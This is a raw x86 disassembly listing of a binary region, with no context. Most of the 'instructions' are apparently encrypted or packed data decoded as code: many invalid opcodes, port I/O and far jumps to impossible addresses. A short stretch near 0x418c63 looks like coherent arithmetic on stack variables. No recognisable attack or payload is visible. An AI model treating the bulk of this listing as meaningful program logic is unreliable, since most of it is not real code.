  418872:	pop    es
  418873:	js     0x418894
  418875:	mov    edi,0xbc73889b
  41887a:	cmp    al,0xdc
  41887c:	sub    ebx,edx
  41887e:	inc    edx
  41887f:	call   0x3def:0xedb5c4b8
  418886:	inc    edx
  418887:	scas   al,BYTE PTR es:[edi]
  418888:	push   ds
  418889:	gs (bad) 
  41888b:	imul   DWORD PTR [ebx-0x3a]
  41888e:	adc    ch,BYTE PTR [edi+0x75]
  418891:	sub    eax,0x4f54fb22
  418896:	jl     0x41887b
  418898:	enter  0xaf69,0x79
  41889c:	lods   eax,DWORD PTR ds:[esi]
  41889d:	call   0xefc70073
  4188a2:	lods   eax,DWORD PTR ds:[esi]
  4188a3:	cld    
  4188a4:	retf   
  4188a5:	jl     0x418887
  4188a7:	adc    eax,0x86abd42f
  4188ac:	dec    edx
  4188ad:	rcr    DWORD PTR [ebp-0x42eef312],cl
  4188b3:	ja     0x41888d
  4188b5:	mov    eax,0x60bdb87f
  4188ba:	inc    ebx
  4188bb:	or     eax,0x5342a248
  4188c0:	xor    eax,0x475494be
  4188c5:	cmp    ah,BYTE PTR [esi]
  4188c7:	mov    al,0xcb
  4188c9:	sar    BYTE PTR [ebp+ebp*8+0x11],0x31
  4188ce:	mov    BYTE PTR [esi+0x1d],ah
  4188d1:	rcr    bl,0xe4
  4188d4:	xchg   ecx,eax
  4188d5:	mov    esi,0x6fcf0c8e
  4188da:	in     al,0xbf
  4188dc:	imul   eax,DWORD PTR [ebp+0x1554145b],0x9b57806a
  4188e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188e7:	mov    edi,0x75f1c43c
  4188ec:	(bad)  
  4188ed:	mov    esi,0xf4f54fb9
  4188f2:	jno    0x41890b
  4188f4:	adc    al,0x8d
  4188f6:	and    bh,BYTE PTR [eax]
  4188f8:	inc    esp
  4188f9:	inc    edx
  4188fa:	pop    ecx
  4188fb:	aam    0xd3
  4188fd:	sbb    BYTE PTR [bp+di-0x64],al
  418901:	xor    ch,BYTE PTR [edx]
  418903:	out    dx,al
  418904:	mov    cl,BYTE PTR [ecx+0x1b4c591c]
  41890a:	loopne 0x418965
  41890c:	loope  0x41888f
  41890e:	cld    
  41890f:	mov    al,0x22
  418911:	mov    dl,0xd5
  418913:	aam    0x85
  418915:	ret    
  418916:	and    DWORD PTR [esi+edi*4+0x7d27466],ebx
  41891d:	lods   al,BYTE PTR ds:[esi]
  41891e:	sahf   
  41891f:	ja     0x4188c6
  418921:	mov    WORD PTR [ebp-0x12],es
  418924:	cmp    DWORD PTR [ebp+0x4abb91cb],edi
  41892a:	iret   
  41892b:	sbb    eax,0xad2d0f51
  418930:	push   cs
  418931:	xor    BYTE PTR [edx+0x1e94a5fa],0x22
  418938:	jne    0x4188d7
  41893a:	or     ch,BYTE PTR [edx+0x2953776b]
  418940:	fsub   st,st(6)
  418942:	jg     0x418986
  418944:	add    ecx,eax
  418946:	shl    BYTE PTR [ecx-0x1b63b644],cl
  41894c:	adc    al,0xfa
  41894e:	mov    esi,0x8e4c282
  418953:	les    esi,FWORD PTR ds:0x8a9a948a
  418959:	out    dx,al
  41895a:	sub    al,0xed
  41895c:	sbb    esp,esp
  41895e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895f:	sar    BYTE PTR [ecx],1
  418961:	aaa    
  418962:	fist   DWORD PTR [edi+0x62b980b3]
  418968:	mov    al,0xc0
  41896a:	call   0xa1dde86a
  41896f:	rcr    esi,cl
  418971:	mov    eax,ds:0x23dc0dd9
  418976:	js     0x418938
  418978:	pushf  
  418979:	and    DWORD PTR [esi-0x152c5580],esp
  41897f:	or     eax,DWORD PTR [edx+0x16]
  418982:	arpl   WORD PTR [edx+0x6c],dx
  418985:	loopne 0x4189b1
  418987:	cwde   
  418988:	mov    ah,0x78
  41898a:	xchg   esp,eax
  41898b:	test   al,0x45
  41898d:	push   ebx
  41898e:	fadd   st(2),st
  418990:	jae    0x41896f
  418992:	or     ah,BYTE PTR [ecx]
  418994:	pop    ss
  418995:	lea    esp,[ecx]
  418997:	adc    DWORD PTR [eax+0x50bf7d1],0x7c
  41899e:	cdq    
  41899f:	adc    BYTE PTR [edx+0x21],dl
  4189a2:	ins    BYTE PTR es:[edi],dx
  4189a3:	adc    edi,eax
  4189a5:	cmp    DWORD PTR [esp+ebx*4-0x4e],ecx
  4189a9:	xor    esp,ecx
  4189ab:	fidivr DWORD PTR cs:[ebx]
  4189ae:	inc    edx
  4189af:	loope  0x418943
  4189b1:	sar    DWORD PTR [edx+0x6f],1
  4189b4:	sbb    eax,0xf2ae4ae4
  4189b9:	test   BYTE PTR [ebp-0x2fa0d8a0],dh
  4189bf:	dec    eax
  4189c0:	jge    0x4189e8
  4189c2:	(bad)  
  4189c3:	call   DWORD PTR [edi-0x4e]
  4189c6:	add    esi,ebx
  4189c8:	in     eax,0x6f
  4189ca:	in     eax,dx
  4189cb:	loopne 0x4189f1
  4189cd:	xchg   esp,eax
  4189ce:	aas    
  4189cf:	dec    esp
  4189d0:	lahf   
  4189d1:	in     eax,0xcf
  4189d3:	loope  0x418a01
  4189d5:	jno    0x418999
  4189d7:	stc    
  4189d8:	cmp    BYTE PTR [esi],cl
  4189da:	lahf   
  4189db:	mov    bl,0xd5
  4189dd:	ja     0x41899f
  4189df:	pop    ecx
  4189e0:	mov    dl,0x32
  4189e2:	mov    cl,0xf1
  4189e4:	jo     0x41896f
  4189e6:	jb     0x4189bd
  4189e8:	shr    BYTE PTR [eax-0x5e],0x3a
  4189ec:	lea    ebx,[eax+0x3c]
  4189ef:	int    0x8a
  4189f1:	in     eax,dx
  4189f2:	xor    eax,0x5bc4dd1b
  4189f7:	jo     0x4189c3
  4189f9:	fcomp  QWORD PTR [edx+0x2e]
  4189fc:	xchg   ebp,eax
  4189fd:	xlat   BYTE PTR ds:[ebx]
  4189fe:	push   0x70
  418a00:	out    dx,eax
  418a01:	xchg   edx,eax
  418a02:	jmp    0x18986a58
  418a07:	das    
  418a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a09:	mov    al,0x81
  418a0b:	push   0x3fc2e0fc
  418a10:	xor    al,0x1c
  418a12:	xor    BYTE PTR [ebx+esi*8],dh
  418a15:	cmp    eax,0x4da6efc6
  418a1a:	jae    0x418a14
  418a1c:	js     0x418a41
  418a1e:	push   ecx
  418a1f:	push   edx
  418a20:	loopne 0x4189b5
  418a22:	or     al,0x1a
  418a25:	inc    edi
  418a26:	sbb    bh,BYTE PTR [eax+0x28200152]
  418a2c:	rol    BYTE PTR [eax-0x45],1
  418a2f:	sti    
  418a30:	aas    
  418a31:	cmp    al,0x62
  418a33:	inc    esp
  418a34:	fsqrt  
  418a36:	stos   BYTE PTR es:[edi],al
  418a37:	fs fdivp st(3),st
  418a3a:	ins    DWORD PTR es:[edi],dx
  418a3b:	add    ah,ch
  418a3d:	fcom   DWORD PTR [ecx+0x15fdd54d]
  418a43:	sar    BYTE PTR [ecx+0x164488b1],0x40
  418a4a:	pop    ss
  418a4b:	stos   DWORD PTR es:[edi],eax
  418a4c:	jge    0x4189fb
  418a4e:	pushf  
  418a4f:	push   esp
  418a50:	inc    eax
  418a51:	ss xor al,bl
  418a54:	push   esp
  418a55:	ror    BYTE PTR [eax+0xca2998],cl
  418a5b:	sbb    al,0x39
  418a5d:	xchg   edx,eax
  418a5e:	inc    esp
  418a5f:	lds    ebx,FWORD PTR [edi+0x1bd9af96]
  418a65:	retf   
  418a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a67:	dec    edx
  418a68:	xchg   ecx,eax
  418a69:	ror    DWORD PTR [esi],1
  418a6b:	sbb    DWORD PTR [eax-0x6638dbbb],edi
  418a71:	scas   al,BYTE PTR es:[edi]
  418a72:	cmp    esi,DWORD PTR [ebp+0x60a399c6]
  418a78:	jg     0x418aaf
  418a7a:	popf   
  418a7b:	jbe    0x4189fd
  418a7d:	out    0xc1,al
  418a7f:	(bad)  
  418a80:	fimul  WORD PTR [esi+ebx*4-0x11a08a74]
  418a87:	in     al,0x51
  418a89:	fistp  WORD PTR [ebx]
  418a8b:	sub    BYTE PTR [ebx-0x6af83a9d],bl
  418a91:	mov    ebp,0x62b804d2
  418a96:	sub    esp,eax
  418a98:	shl    BYTE PTR [ecx],cl
  418a9a:	jmp    0xd8b0:0xa8d8634f
  418aa1:	cdq    
  418aa2:	icebp  
  418aa3:	sub    BYTE PTR [ebp+0x1],0x65
  418aa7:	retf   
  418aa8:	(bad)  
  418aa9:	push   cs
  418aaa:	jo     0x418b06
  418aac:	jmp    0x8f8678b5
  418ab1:	and    dl,BYTE PTR [edx+0x25abb19e]
  418ab7:	dec    esp
  418ab8:	dec    esi
  418ab9:	cmc    
  418aba:	mov    ds:0x45fcda8,eax
  418abf:	test   al,0x2
  418ac1:	out    0x32,eax
  418ac3:	jae    0x418b3a
  418ac5:	fstp   QWORD PTR [ecx]
  418ac7:	fadd   st(6),st
  418ac9:	out    0xe4,eax
  418acb:	push   eax
  418acc:	inc    ebp
  418acd:	daa    
  418ace:	sub    ebx,DWORD PTR [ebp+0x7db760aa]
  418ad4:	xchg   edx,eax
  418ad5:	cs int3 
  418ad7:	xchg   esi,eax
  418ad8:	retf   
  418ad9:	inc    ebp
  418ada:	ret    0x1fc5
  418add:	push   eax
  418ade:	inc    edx
  418adf:	and    eax,0x44780ff6
  418ae4:	sub    edi,DWORD PTR [ecx+0x73acd80a]
  418aea:	sbb    dl,BYTE PTR ds:0x871d18c4
  418af0:	xchg   DWORD PTR [esi+0x45385fad],ecx
  418af6:	jmp    DWORD PTR [esp+esi*2+0x13]
  418afa:	jge    0x418ace
  418afc:	sar    esi,cl
  418afe:	mov    edi,0x58691276
  418b03:	ficom  WORD PTR [ecx]
  418b05:	cmp    al,0xb8
  418b07:	test   eax,0x29c1c5d4
  418b0c:	sbb    edx,edx
  418b0e:	jnp    0x418b43
  418b10:	outs   dx,BYTE PTR ds:[esi]
  418b11:	xor    DWORD PTR [eax-0x48],0x5f699d72
  418b18:	adc    eax,0x5108d293
  418b1d:	adc    DWORD PTR [ebp-0x3c],esi
  418b20:	aaa    
  418b21:	(bad)  
  418b22:	pop    ebx
  418b23:	cmp    BYTE PTR [eax+0x4ebbf8f2],bl
  418b29:	pop    esi
  418b2a:	adc    eax,0xa4f19d6d
  418b2f:	jmp    0x13f14bb8
  418b34:	and    DWORD PTR [eax-0x30],esp
  418b37:	neg    BYTE PTR [ecx+0x7a5a02b9]
  418b3d:	or     cl,BYTE PTR [esi-0x16]
  418b40:	and    cl,cl
  418b42:	ja     0x418b67
  418b44:	mov    dh,0x1a
  418b46:	cs test al,0x1d
  418b49:	out    0xb0,eax
  418b4b:	dec    edi
  418b4c:	or     edi,ecx
  418b4e:	ror    BYTE PTR ds:0x1b500716,cl
  418b54:	push   esp
  418b55:	push   edx
  418b56:	push   0xe613c683
  418b5b:	cld    
  418b5c:	aam    0x17
  418b5e:	sbb    DWORD PTR [ebp+0x4818b2a1],eax
  418b64:	data16 sbb BYTE PTR [edx-0x49],dl
  418b68:	xor    BYTE PTR [ecx+0x2d],bl
  418b6b:	xor    edi,DWORD PTR [ecx+0x7a7beb90]
  418b71:	mov    ah,0xe1
  418b73:	gs loope 0x418ba9
  418b76:	sbb    BYTE PTR [ebx],dl
  418b78:	arpl   WORD PTR ds:0x54ccd0bc,ax
  418b7e:	cmp    edi,ebp
  418b80:	lods   eax,DWORD PTR ds:[esi]
  418b81:	xchg   ebx,eax
  418b82:	or     esi,ebp
  418b84:	faddp  st(6),st
  418b86:	push   edi
  418b87:	pop    ecx
  418b88:	pushf  
  418b89:	in     eax,0x9d
  418b8b:	xchg   edx,eax
  418b8c:	mov    edi,0xa0ccd458
  418b91:	cdq    
  418b92:	fld    DWORD PTR [edi]
  418b94:	stos   BYTE PTR es:[edi],al
  418b95:	test   eax,0xaa5b30ce
  418b9a:	add    ecx,ebp
  418b9c:	rcl    DWORD PTR [esi+0x4bea2c26],1
  418ba2:	sbb    BYTE PTR [ebx],ah
  418ba4:	or     cl,BYTE PTR [ebp+eax*2+0x7b7615aa]
  418bab:	dec    eax
  418bac:	test   eax,0xc51f2371
  418bb1:	dec    ebp
  418bb2:	sub    al,0x6b
  418bb4:	jmp    0x7b3f:0xbae959a8
  418bbb:	jne    0x418ba5
  418bbd:	jae    0x418c14
  418bbf:	pop    ss
  418bc0:	pop    edx
  418bc1:	sub    BYTE PTR [edx],0x71
  418bc4:	loop   0x418bd4
  418bc6:	jp     0x418bf3
  418bc8:	in     eax,dx
  418bc9:	mov    al,ds:0xaaf94544
  418bce:	dec    eax
  418bcf:	push   ecx
  418bd0:	jg     0x418ba7
  418bd2:	call   0x25c2:0x434bbcd9
  418bd9:	jns    0x418bce
  418bdb:	(bad)  
  418bdc:	out    dx,eax
  418bdd:	sub    bh,BYTE PTR [edi-0x23888de2]
  418be3:	xlat   BYTE PTR ds:[ebx]
  418be4:	inc    esi
  418be5:	gs test ch,cl
  418be8:	dec    edi
  418be9:	cmp    esp,0xffffffc0
  418bec:	test   eax,0x35d04eb
  418bf1:	pusha  
  418bf2:	mov    eax,0x88ba3243
  418bf7:	pop    esp
  418bf8:	sbb    BYTE PTR [ebx+ecx*8-0x7b],0xfc
  418bfd:	out    0x50,al
  418bff:	push   edx
  418c00:	outs   dx,DWORD PTR ds:[esi]
  418c01:	popa   
  418c02:	cmc    
  418c03:	inc    ebp
  418c04:	mov    cl,0xad
  418c06:	mov    esi,0x3fadceca
  418c0b:	int3   
  418c0c:	ds mov ah,0x6d
  418c0f:	cmc    
  418c10:	mov    edx,0x1c4c4c0a
  418c15:	cs adc al,0x5b
  418c18:	inc    ebx
  418c19:	aam    0x59
  418c1b:	ror    BYTE PTR [ebp+0x14ecc14d],cl
  418c21:	cmc    
  418c22:	inc    edx
  418c23:	sub    dl,BYTE PTR [ebx+edx*2-0x77]
  418c27:	pop    ds
  418c28:	jo     0x418c08
  418c2a:	xchg   ebx,eax
  418c2b:	mov    ah,0xa
  418c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c2e:	and    bl,BYTE PTR [eax-0x29a80022]
  418c34:	jmp    DWORD PTR [ecx*1+0x5f45079b]
  418c3b:	inc    eax
  418c3c:	jg     0xabc955c7
  418c42:	jge    0x418cbb
  418c44:	das    
  418c45:	lea    esp,[edx]
  418c47:	inc    ecx
  418c48:	in     eax,dx
  418c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c4a:	scas   eax,DWORD PTR es:[edi]
  418c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4c:	mov    ebp,0xcea2f3d9
  418c51:	xlat   BYTE PTR ds:[ebx]
  418c52:	xor    dl,0xfc
  418c55:	jmp    0x9f52:0xe878889e
  418c5c:	inc    esi
  418c5d:	in     al,dx
  418c5e:	dec    edx
  418c5f:	mov    ah,0x9a
  418c61:	addr16 cld 
  418c63:	pop    ebp
  418c64:	push   esp
  418c65:	xchg   ecx,eax
  418c66:	mov    ebx,DWORD PTR [ebp-0x50]
  418c69:	add    edx,ecx
  418c6b:	xor    edx,ebx
  418c6d:	mov    DWORD PTR [ebp-0x50],edx
  418c70:	mov    edx,DWORD PTR [ebp+0x8]
  418c73:	mov    ebx,DWORD PTR [ebp-0x4c]
  418c76:	add    edx,edi
  418c78:	and    edx,ebx
  418c7a:	mov    DWORD PTR [ebp-0x4c],edx
  418c7d:	mov    edx,DWORD PTR [ebp+0x8]
  418c80:	mov    ebx,DWORD PTR [ebp-0x48]
  418c83:	lea    edx,[ebx+edx*1+0x241fcde]
  418c8a:	mov    DWORD PTR [ebp-0x48],edx
  418c8d:	mov    edx,DWORD PTR [ebp+0x8]
  418c90:	mov    ebx,0xfa5e1521
  418c95:	sub    ebx,edx
  418c97:	add    ebx,DWORD PTR [ebp-0x44]
  418c9a:	mov    DWORD PTR [ebp-0x44],ebx
  418c9d:	mov    edx,DWORD PTR [ebp+0x8]
  418ca0:	xor    edx,eax
  418ca2:	add    edx,esi
  418ca4:	jne    0x4144eb
  418caa:	jmp    0x41b0d8
  418caf:	jmp    0x41b050
  418cb4:	ins    BYTE PTR es:[edi],dx
  418cb5:	loopne 0x418cba
  418cb7:	jmp    0x418c3c
  418cb9:	mov    eax,DWORD PTR [ebx+ebx*8+0x6fd1292a]
  418cc0:	loope  0x418c63
  418cc2:	pop    edx
  418cc3:	pop    ecx
  418cc4:	xor    bl,BYTE PTR [edi]
  418cc6:	jge    0x418d42
  418cc8:	(bad)  
  418cc9:	pop    edi
  418cca:	jp     0x418d46
  418ccc:	push   0x66c50688
  418cd1:	es cmp al,0x76
  418cd4:	jns    0x418cc8
  418cd6:	cld    
  418cd7:	in     al,dx
  418cd8:	cmp    DWORD PTR [eax],ecx
  418cda:	push   es
  418cdb:	push   ebx
  418cdc:	aam    0x1b
  418cde:	pop    ebp
  418cdf:	inc    eax
  418ce0:	sub    dh,ch
  418ce2:	fld    TBYTE PTR [ebp-0x4b394bef]
  418ce8:	fs adc ecx,0x7afbb513
  418cef:	or     eax,0x2d4e418f
  418cf4:	clc    
  418cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cf6:	mov    esi,0xf49c838b
  418cfb:	dec    eax
  418cfc:	jecxz  0x418cbf
  418cfe:	mov    al,ds:0x7bb3039a
  418d03:	rol    DWORD PTR [ecx+0x4ea2fff7],1
  418d09:	fmul   DWORD PTR [esi-0x17]
  418d0c:	fwait
  418d0d:	nop
  418d0e:	(bad)  
  418d0f:	fldl2t 
  418d11:	xchg   dh,bl
  418d13:	and    dh,ch
  418d15:	sub    eax,0xa9706561
  418d1a:	mov    edx,0x16a8f822
  418d1f:	push   ebx
  418d20:	mov    ds:0xcdf5ce1e,al
  418d25:	fsub   QWORD PTR [ebp-0x181bf679]
  418d2b:	cmp    dh,BYTE PTR [edi-0x3c]
  418d2e:	rep outs dx,DWORD PTR ds:[esi]
  418d30:	icebp  
  418d31:	sar    al,cl
  418d33:	xchg   edi,eax
  418d34:	and    eax,0xdc9f1607
  418d39:	ins    DWORD PTR es:[edi],dx
  418d3a:	pop    ebp
  418d3b:	push   ss
  418d3c:	adc    bl,bl
  418d3e:	mov    ebx,0x7172f24a
  418d43:	(bad)  
  418d44:	je     0x418d68
  418d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d47:	cmp    esp,ebx
  418d49:	or     bl,bh
  418d4b:	add    ch,BYTE PTR [edx]
  418d4d:	xor    DWORD PTR [esi+esi*1-0x317e6423],eax
  418d54:	rcl    DWORD PTR ds:0x90f13338,cl
  418d5a:	and    eax,0x49455735
  418d5f:	jae    0x418d77
  418d61:	mov    eax,0xf3a73156
  418d66:	test   al,0x42
  418d68:	inc    edi
  418d69:	sub    BYTE PTR [edx],ah
  418d6b:	sub    DWORD PTR [esp+edi*1+0x34],ecx
  418d6f:	leave  
  418d70:	sub    DWORD PTR [ecx-0x1449d887],0x44
  418d77:	fadd   QWORD PTR [edi-0x4f]
  418d7a:	mov    ecx,0x6d207e38
  418d7f:	jle    0x418d17
  418d81:	cli    
  418d82:	sbb    ebx,DWORD PTR [ecx-0x28]
  418d85:	jae    0x418e03
  418d87:	gs pop ebx
  418d89:	pusha  
  418d8a:	jp     0x418d0f
  418d8c:	add    ebx,DWORD PTR [ebx]
  418d8e:	pop    eax
  418d8f:	in     eax,dx
  418d90:	rol    BYTE PTR [ebx-0x29],0xf8
  418d94:	test   dh,cl
  418d96:	cs popa 
  418d98:	in     al,0x5
  418d9a:	in     al,dx
  418d9b:	add    dl,BYTE PTR [eax-0x37]
  418d9e:	test   BYTE PTR [ebx-0x68b7a422],bl
  418da4:	mov    ds:0x6c100164,al
  418da9:	loope  0x418d86
  418dab:	mov    ch,0x11
  418dad:	pop    eax
  418dae:	cld    
  418daf:	or     al,0xe8
  418db1:	mov    ebp,0x38a98b4
  418db6:	out    0x17,eax
  418db8:	pushf  
  418db9:	inc    ecx
  418dba:	jo     0x418de2
  418dbc:	xchg   esp,eax
  418dbd:	pop    es
  418dbe:	fadd   DWORD PTR [eax-0x7521f7e2]
  418dc4:	push   edx
  418dc5:	dec    ebp
  418dc6:	mov    ds:0x698a19ea,eax
  418dcb:	dec    ecx
  418dcc:	test   eax,0x2f0549ea
  418dd1:	push   ss
  418dd2:	mov    ds:0xe4d0be32,al
  418dd7:	xor    ebp,DWORD PTR [edi+edi*8]
  418dda:	add    bl,BYTE PTR [ecx+0x2fa4091a]
  418de0:	mov    dh,0x55
  418de2:	sbb    DWORD PTR [ebp-0x4f],ecx
  418de5:	in     al,dx
  418de6:	(bad)  
  418de7:	(bad)  [ecx*8+0x4e0edb92]
  418dee:	in     eax,0x10
  418df0:	jp     0x418d94
  418df2:	xchg   bl,dl
  418df4:	imul   ebp,ecx,0x785d8af
  418dfa:	xchg   ebx,eax
  418dfb:	fild   QWORD PTR [esi-0x73]
  418dfe:	inc    esp
  418dff:	out    dx,al
  418e00:	shl    BYTE PTR [edi],cl
  418e02:	call   0xfe5ee6ea
  418e07:	dec    edi
  418e08:	ss jecxz 0x418e0e
  418e0b:	sub    al,0x5
  418e0d:	sub    eax,0x19a0a3f5
  418e12:	inc    ebx
  418e13:	adc    al,0x82
  418e15:	int3   
  418e16:	clts   
  418e18:	fiadd  WORD PTR [edi]
  418e1a:	out    dx,al
  418e1b:	loopne 0x418ddc
  418e1d:	mov    eax,0xe211fe67
  418e22:	fptan  
  418e24:	inc    edx
  418e25:	(bad)  
  418e26:	mov    esp,0xd29b742d
  418e2b:	outs   dx,DWORD PTR ds:[esi]
  418e2c:	pop    esi
  418e2d:	push   ss
  418e2e:	fst    QWORD PTR [edx+ecx*1+0x96a2b4a]
  418e35:	and    bh,bl
  418e37:	sub    BYTE PTR [ecx+0x44],dh
  418e3a:	pusha  
  418e3b:	push   edi
  418e3c:	jle    0x418de4
  418e3e:	xchg   edi,eax
  418e3f:	out    dx,eax
  418e40:	mov    ch,0xa4
  418e43:	and    esi,edi
  418e45:	pop    ss
  418e46:	sti    
  418e47:	pop    ebx
  418e48:	and    dl,BYTE PTR [edi+0x2bf8084a]
  418e4e:	lods   eax,DWORD PTR ds:[esi]
  418e4f:	rcl    BYTE PTR [ebx],1
  418e51:	scas   al,BYTE PTR es:[edi]
  418e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e53:	dec    esp
  418e54:	data16 add cl,bh
  418e57:	or     ah,BYTE PTR [ebx]
  418e59:	iret   
  418e5a:	popf   
  418e5b:	test   eax,0x66aa7f8a
  418e60:	and    eax,0x9f3398b5
  418e65:	push   0xbcd9a740
  418e6a:	cmp    bl,BYTE PTR [edi]
  418e6c:	push   ebp
  418e6d:	xchg   ebx,eax
  418e6e:	in     eax,dx
  418e6f:	fchs   
  418e71:	jmp    0xb40eb699
  418e76:	push   0x296218f4
  418e7b:	and    BYTE PTR [ebp-0x32],ah
  418e7e:	dec    edi
  418e7f:	ret    
  418e80:	aas    
  418e81:	pop    esp
  418e82:	inc    edx
  418e83:	fwait
  418e84:	dec    ecx
  418e85:	out    0xf5,eax
  418e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e88:	repz into 
  418e8a:	inc    ecx
  418e8b:	retf   
  418e8c:	mov    ds:0xc8d28f0,eax
  418e91:	or     DWORD PTR [ecx-0x251f18d9],eax
  418e97:	mov    esp,0xa35cb58e
  418e9c:	sub    BYTE PTR [esi+0x901056b],cl
  418ea2:	arpl   dx,ax
  418ea4:	pop    edx
  418ea5:	or     eax,0xf2fe3994
  418eaa:	retf   0x1359
  418ead:	clc    
  418eae:	aad    0xc3
  418eb0:	call   0xe6f3075c
  418eb5:	call   0xd22d:0x7fb20f2
  418ebc:	loop   0x418e9f
  418ebe:	in     eax,dx
  418ebf:	stos   BYTE PTR es:[edi],al
  418ec0:	inc    edx
  418ec1:	scas   al,BYTE PTR es:[edi]
  418ec2:	xchg   ebp,eax
  418ec3:	add    BYTE PTR [esi],cl
  418ec5:	push   ebx
  418ec6:	(bad)  
  418ec7:	mov    dh,0x4e
  418ec9:	mov    eax,0x96ab57cf
  418ece:	jno    0x418ecb
  418ed0:	pushf  
  418ed1:	fadd   DWORD PTR [esi+0x7fe8a09d]
  418ed7:	sar    BYTE PTR [ecx+0x1a],0x93
  418edb:	xchg   ebx,eax
  418edc:	sahf   
  418edd:	jp     0x418ec6
  418edf:	in     al,0xd0
  418ee1:	xchg   edx,eax
  418ee2:	xor    edi,DWORD PTR [esi-0x14]
  418ee5:	mov    BYTE PTR [eax-0x79],cl
  418ee8:	xchg   esp,eax
  418ee9:	outs   dx,BYTE PTR ds:[esi]
  418eea:	jg     0x418f35
  418eec:	xor    ebx,edi
  418eee:	cmc    
  418eef:	mov    cl,0xa3
  418ef1:	jmp    0xa76a:0xd2b74e4f
  418ef8:	sahf   
  418ef9:	dec    ebp
  418efa:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418efc:	xchg   edi,eax
  418efd:	pop    es
  418efe:	and    al,0xd4
  418f00:	and    esi,DWORD PTR ds:0xec518929
  418f06:	in     al,dx
  418f07:	push   cs
  418f08:	xchg   BYTE PTR [esi-0x2e9b1cfd],cl
  418f0e:	mov    ah,0x13
  418f10:	jg     0x418f84
  418f12:	jecxz  0x418ee4
  418f14:	and    BYTE PTR [esi],dh
  418f16:	mov    ss,ebx
  418f18:	out    dx,eax
  418f19:	xor    bh,BYTE PTR [ecx]
  418f1b:	jecxz  0x418ec9
  418f1d:	bound  edi,QWORD PTR [esi-0xba93b9c]
  418f23:	pop    ebx
  418f24:	xlat   BYTE PTR ds:[ebx]
  418f25:	(bad)  
  418f27:	into   
  418f28:	adc    bl,BYTE PTR [esi]
  418f2a:	ja     0x418ef1
  418f2c:	in     eax,0x3
  418f2e:	inc    ebp
  418f2f:	ss call 0x4cf3:0xeb253aef
  418f37:	les    eax,FWORD PTR [edi-0x2f]
  418f3a:	lds    ebx,FWORD PTR [ebp-0x2c26e82f]
  418f40:	adc    ecx,DWORD PTR [edi-0x21]
  418f43:	hlt    
  418f44:	stos   BYTE PTR es:[edi],al
  418f45:	sub    ebp,DWORD PTR [edx]
  418f47:	outs   dx,BYTE PTR ds:[esi]
  418f48:	dec    ecx
  418f49:	cmp    dh,ah
  418f4b:	xchg   esp,eax
  418f4c:	pop    es
  418f4d:	fmul   DWORD PTR [edi+0x248f8447]
  418f53:	aas    
  418f54:	jle    0x418f5b
  418f56:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f58:	inc    ecx
  418f59:	xor    eax,0x4934632
  418f5e:	and    DWORD PTR [edi-0x126cb1bf],esp
  418f64:	jne    0x418fd8
  418f66:	and    ch,bl
  418f68:	xchg   esi,eax
  418f69:	sbb    ah,ch
  418f6b:	fst    DWORD PTR [edx]
  418f6d:	xor    eax,0xe2cd9179
  418f72:	jb     0x418fe8
  418f74:	sub    ecx,DWORD PTR gs:[ebp+0x75d4ccbe]
  418f7b:	out    0xf6,al
  418f7d:	mov    bh,0xe6
  418f7f:	lods   eax,DWORD PTR ds:[esi]
  418f80:	sub    ecx,DWORD PTR [edi-0x52]
  418f83:	adc    edi,DWORD PTR [edi]
  418f85:	mov    ds:0x1299811c,eax
  418f8a:	lahf   
  418f8b:	mov    dl,0x5a
  418f8d:	outs   dx,BYTE PTR ds:[esi]
  418f8e:	fwait
  418f8f:	(bad)  
  418f90:	into   
  418f91:	(bad)  
  418f92:	xlat   BYTE PTR ds:[ebx]
  418f93:	sub    ebx,ebx
  418f95:	fidivr DWORD PTR [ebp+0x17a41e03]
  418f9b:	pop    edi
  418f9c:	pop    ss
  418f9d:	mov    ds:0xd3998c95,eax
  418fa2:	inc    ebx
  418fa3:	gs gs stos DWORD PTR es:[edi],eax
  418fa6:	dec    esi
  418fa7:	pusha  
  418fa8:	jl     0x418fb9
  418faa:	jl     0x418fc0
  418fac:	ins    DWORD PTR es:[edi],dx
  418fad:	and    DWORD PTR [ecx],0x6af36faf
  418fb3:	sahf   
  418fb4:	pop    edi
  418fb5:	inc    eax
  418fb6:	xchg   ecx,eax
  418fb7:	(bad)  
  418fb8:	ret    0x93f0
  418fbb:	xor    DWORD PTR cs:[ebx-0x57b199ff],0x54
  418fc3:	lods   al,BYTE PTR ds:[esi]
  418fc4:	xchg   edi,eax
  418fc5:	out    dx,eax
  418fc6:	sbb    DWORD PTR [edx+edx*1],ebx
  418fc9:	pop    edx
  418fca:	inc    edx
  418fcb:	sbb    BYTE PTR [edx-0x3e],0xb8
  418fcf:	popa   
  418fd0:	aad    0xb
  418fd2:	dec    eax
  418fd3:	or     al,0xf4
  418fd5:	retf   0x4c39
  418fd8:	sbb    al,0xca
  418fda:	div    DWORD PTR [ecx+0x36]
  418fdd:	xchg   dh,cl
  418fdf:	sub    BYTE PTR [esi-0x18],dh
  418fe2:	add    BYTE PTR [esi],dl
  418fe4:	push   esp
  418fe5:	stos   DWORD PTR es:[edi],eax
  418fe6:	int3   
  418fe7:	je     0x418f85
  418fe9:	push   esp
  418fea:	mov    esi,0x650449
  418fef:	jge    0x418ffd
  418ff1:	inc    esi
  418ff2:	lock xchg ebx,eax
  418ff4:	daa    
  418ff5:	fistp  WORD PTR [edx-0x4ac1429d]
  418ffb:	enter  0x4e29,0x5c
  418fff:	es retf 
  419001:	daa    
  419002:	inc    ebx
  419003:	xchg   edi,eax
  419004:	sub    DWORD PTR [eiz*4+0x6be28bd6],0x59294ffd
  41900f:	mov    WORD PTR [ecx],ss
  419011:	dec    ecx
  419012:	aas    
  419013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419014:	jp     0x41900c
  419016:	stc    
